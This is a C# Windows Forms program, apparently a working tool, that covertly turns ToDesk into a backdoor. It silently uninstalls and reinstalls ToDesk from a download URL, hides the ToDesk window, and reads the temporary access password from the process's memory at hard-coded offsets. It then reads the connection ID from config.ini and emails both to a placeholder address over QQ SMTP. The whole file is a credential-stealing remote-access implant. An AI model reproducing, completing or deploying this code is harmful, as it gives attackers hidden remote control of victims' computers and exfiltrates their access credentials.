using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace internetLoadDesk
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private int over(string errorMessage)
        {
            MessageBox.Show(errorMessage);
            Close();
            return -1;
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        private static extern int FindWindowEx(int hwndParent, int hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_HIDE = 0;


        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        const uint PROCESS_VM_READ = 0x0010;
        const int BUFFER_SIZE = 8; // Assuming the tempass is 8 bytes long

        static void SendEmail(string to, string subject, string body)
        {
            // 创建一个 MailMessage 对象
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("邮箱服务器smtp.qq.com");

            mail.From = new MailAddress("发件人账号@foxmail.com");
            mail.To.Add(to);
            mail.Subject = subject;
            mail.Body = body;

            // 设置是否为HTML格式
            mail.IsBodyHtml = true;  // 如果邮件正文是HTML格式，则设置为true

            try
            {
                // 使用指定的 SmtpServer 发送邮件
                SmtpServer.Port = 587;  // SMTP服务器端口，默认为25，但现在很多使用587
                SmtpServer.Credentials = new NetworkCredential("发件人账号@foxmail.com", "发件人密码");
                SmtpServer.EnableSsl = true;  // 如果服务器需要SSL加密则设置为true

                SmtpServer.Send(mail);
                //Console.WriteLine("邮件发送成功！");
            }
            catch (Exception ex)
            {
                //Console.WriteLine("邮件发送失败：" + ex.ToString());
            }
        }

        private string ReadIniFileForKey(string path, string key)
        {
            try
            {
                using (StreamReader reader = new StreamReader(path))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        // 忽略空白行和注释行
                        if (string.IsNullOrWhiteSpace(line) || line.StartsWith(";") || line.StartsWith("#"))
                            continue;

                        // 处理 [section] 行，如果有多节的话，这里可以添加逻辑来处理
                        if (line.StartsWith("[") && line.EndsWith("]"))
                            continue;

                        // 分割键值对
                        var parts = line.Split(new[] { '=' }, 2);
                        if (parts.Length == 2)
                        {
                            string keyPart = parts[0].Trim();
                            string valuePart = parts[1].Trim();
                            if (keyPart == key)
                            {
                                return valuePart;
                            }
                        }
                    }
                }
            }
            catch (FileNotFoundException)
            {
                over("文件未找到，请检查路径是否正确。");
            }
            catch (IOException e)
            {
                over($"读取文件时发生错误: {e.Message}");
            }
            return null;
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            //卸载原有todesk
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "C:\\Program Files\\ToDesk\\uninst.exe",
                    Arguments = "/S",
                    UseShellExecute = false, // 不使用外壳程序执行
                    CreateNoWindow = true,   // 不创建新窗口
                    WindowStyle = ProcessWindowStyle.Hidden // 隐藏窗口
                };

                using (Process process = Process.Start(startInfo))
                {
                    if (process != null)
                    {
                        // 等待进程结束
                        process.WaitForExit();
                    }
                }
            }
            catch (Exception ex)
            {
            }


            //下载4.7.4.7版本的todesk
            string url = "http://192.168.242.1/ToDesk_Setup.exe";
            string savePath = @"C:\Users\Public\Downloads\ToDesk_Setup.exe";

            using (WebClient client = new WebClient())
            {
                try
                {
                    client.DownloadFile(url, savePath);
                }
                catch (Exception ex)
                {
                    over($"下载失败: {ex.Message}");
                }
            }

            
            //后台静默安装
            string filePath = @"C:\Users\Public\Downloads\ToDesk_Setup.exe";
            string arguments = "/S";

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = filePath,
                    Arguments = arguments,
                    UseShellExecute = false, // 不使用外壳程序执行
                    CreateNoWindow = true,   // 不创建新窗口
                    WindowStyle = ProcessWindowStyle.Hidden // 隐藏窗口
                };

                using (Process process = Process.Start(startInfo))
                {
                    if (process != null)
                    {
                        // 等待进程结束
                        process.WaitForExit();
                    }
                    else
                    {
                        over("无法启动安装程序。");
                    }
                }
            }
            catch (Exception ex)
            {
                over($"启动程序时发生错误: {ex.Message}");
            }


            Thread.Sleep(5000);
            //隐藏todek窗口
            IntPtr hWnd = FindWindow(null, "ToDesk");

            if (hWnd != IntPtr.Zero)
            {
                ShowWindow(hWnd, SW_HIDE);
            }
            else
            {
                MessageBox.Show("未找到标题为 'ToDesk' 的窗口。");
            }
            
            //获取ToDesk密码
            string username = "";
            try
            {
                // Find the process by name
                Process[] processes = Process.GetProcessesByName("ToDesk");
                if (processes.Length == 0)
                {
                    //Console.WriteLine("Could not find ToDesk.exe process.");

                }

                // Get the first instance of ToDesk.exe
                Process toDeskProcess = processes[0];
                uint processId = (uint)toDeskProcess.Id;

                // Open the process with read memory permissions
                IntPtr hProcess = OpenProcess(PROCESS_VM_READ, false, processId);
                if (hProcess == IntPtr.Zero)
                {
                    //Console.WriteLine("Failed to open process.");

                }

                // Calculate addresses based on offsets
                IntPtr baseAddress = (IntPtr)(long)toDeskProcess.MainModule.BaseAddress;
                //Console.WriteLine($"Base address: {baseAddress:X}");

                // Allocate buffer for reading the first offset
                byte[] offset1Buffer = new byte[8];
                IntPtr offset1BufferPtr = Marshal.AllocHGlobal(8);

                try
                {
                    // Attempt to read the first offset
                    if (!ReadProcessMemory(hProcess, new IntPtr((long)baseAddress + 0x0227DE70), offset1Buffer, 8, out uint bytesRead1))
                    {
                        //Console.WriteLine("Failed to read first offset.");

                    }

                    //Console.WriteLine($"Bytes read for Offset 1: {bytesRead1}");

                    // Check if we actually read any data
                    if (bytesRead1 != 8)
                    {
                        //Console.WriteLine("Did not read full 8 bytes for Offset 1.");

                    }

                    long offset1Value = BitConverter.ToInt64(offset1Buffer, 0);
                    IntPtr offset1 = new IntPtr(offset1Value);
                    //Console.WriteLine($"Offset 1: {offset1:X}");

                    // Calculate second offset
                    IntPtr offset2 = new IntPtr((long)offset1 + 0x190);
                    //Console.WriteLine($"Offset 2: {offset2:X}");

                    // Prepare buffer for reading
                    byte[] buffer = new byte[BUFFER_SIZE];
                    uint bytesRead2 = 0;

                    // Read from process memory
                    if (!ReadProcessMemory(hProcess, offset2, buffer, (uint)BUFFER_SIZE, out bytesRead2))
                    {
                        //Console.WriteLine("Failed to read memory.");
                    }

                    //Console.WriteLine($"Bytes read for tempass: {bytesRead2}");

                    // Check if we actually read any data
                    if (bytesRead2 != BUFFER_SIZE)
                    {
                        //Console.WriteLine("Did not read full 8 bytes for tempass.");
                    }

                    // Convert byte array to string
                    username = Encoding.ASCII.GetString(buffer).TrimEnd('\0');
                    //Console.WriteLine($"tempass: {username}");
                }
                finally
                {
                    Marshal.FreeHGlobal(offset1BufferPtr); // Free allocated memory
                }

                // Close handle to process
                CloseHandle(hProcess);

                string cfgfilePath = @"C:\Program Files\ToDesk\config.ini";
                string clientId = ReadIniFileForKey(cfgfilePath, "clientId");

                if (!string.IsNullOrEmpty(clientId))
                {
                    //Console.WriteLine($"clientId: {clientId}");
                }
                else
                {
                    over("未能找到clientId的值。");
                }

                string sendtext = "密码为:" + username + "\n连接ID为:" + clientId;
                SendEmail("收件人信息@qq.com", "获取成功", sendtext);

            }
            catch (Exception ex)
            {
                over($"An error occurred: {ex.Message}");
            }

            Close();

        }
    }
}
